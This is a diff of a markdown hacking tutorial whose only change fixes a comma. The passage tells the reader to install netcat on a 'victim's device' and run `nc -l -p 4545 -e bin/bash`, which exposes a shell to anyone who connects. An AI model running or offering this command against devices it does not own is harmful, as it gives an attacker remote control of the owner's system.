@@ -20,7 +20,7 @@ First Lets understand how to create a Reverse shell with Netcat command, Also if
 
 ***Victim's Device :***
         
-  First you need netcat installed on your victim's device, if it's an Android or IOS then install it via Termux or iSH, and if it's Win or Mac install it through [nmap website](https://nmap.org/download.html) (netcat is pre-installed in linux). After installing netcat you just have to open a port where your device will connect (in this example the port will be "4545") and after connection with the "e" flag we will tell the device which file to execute.
+  First you need netcat installed on your victim's device, if it's an Android or IOS then install it via Termux or iSH, and if it's Win or Mac install it through [nmap website](https://nmap.org/download.html) (netcat is pre-installed in linux). After installing netcat you just have to open a port where your device will connect (in this example the port will be "4545") and after connection, with the "e" flag we will tell the device which file to execute.
 ```
 nc -l -p 4545 -e bin/bash
 ```
